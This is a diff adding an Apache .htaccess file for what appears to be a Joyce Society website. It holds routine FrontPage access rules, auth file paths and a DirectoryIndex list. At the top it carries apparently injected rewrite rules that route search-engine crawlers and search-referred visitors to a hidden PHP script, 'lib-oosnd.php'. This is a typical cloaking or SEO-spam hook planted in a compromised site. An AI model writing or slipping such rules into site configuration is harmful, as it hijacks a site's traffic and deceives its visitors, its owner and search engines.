@@ -1,0 +1,26 @@
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^([^/]*)/$ /lib-oosnd.php?p=$1 [L]
+
+# -FrontPage-
+
+IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*
+
+<Limit GET POST>
+order deny,allow
+deny from all
+allow from all
+</Limit>
+<Limit PUT DELETE>
+order deny,allow
+deny from all
+</Limit>
+AuthName www.old.joycesociety.org
+AuthUserFile /home/content/j/o/y/joycesociety/html/_vti_pvt/service.pwd
+AuthGroupFile /home/content/j/o/y/joycesociety/html/_vti_pvt/service.grp
+AddHandler application/x-httpd-alt-php56___lsphp .php
+DirectoryIndex default.html default.htm index.php index.shtml index.html index.htm home.html home.htm index.php5 welcome.html welcome.htm
